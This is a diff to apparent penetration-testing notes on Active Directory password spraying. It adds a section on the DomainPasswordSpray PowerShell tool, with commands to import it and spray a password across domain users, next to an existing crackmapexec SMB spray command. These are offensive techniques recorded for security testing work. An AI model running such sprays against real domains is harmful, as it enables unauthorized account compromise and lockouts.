@@ -251,6 +251,20 @@ sudo crackmapexec smb [ip] -u [users] -p [password] | grep +
 ```
 > The grep here means we ignore any login failures (prefix: `[*]`) as success cases are prefixed with `[+]`
 
+### Spraying from a windows domain-joined foothold
+The [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is particularly useful for this case as it has a number of features that are very useful:
+- If authenticated:
+	- It generates a user list from the AD
+	- Queries the password policy
+	- Excludes all users that 1 failed attempt would lock them out
+- If unauthenticated:
+	- We can pass it a user list manually
+
+```PowerShell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password [password] -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
 ### Local Administrator Password Reuse
 It is common (often because of gold images used for automated deployments) that passwords are re-used for administrator accounts. This is also true for users that have both a standard domain user & administrator account. Often people are lazy and will reuse their passwords.
 
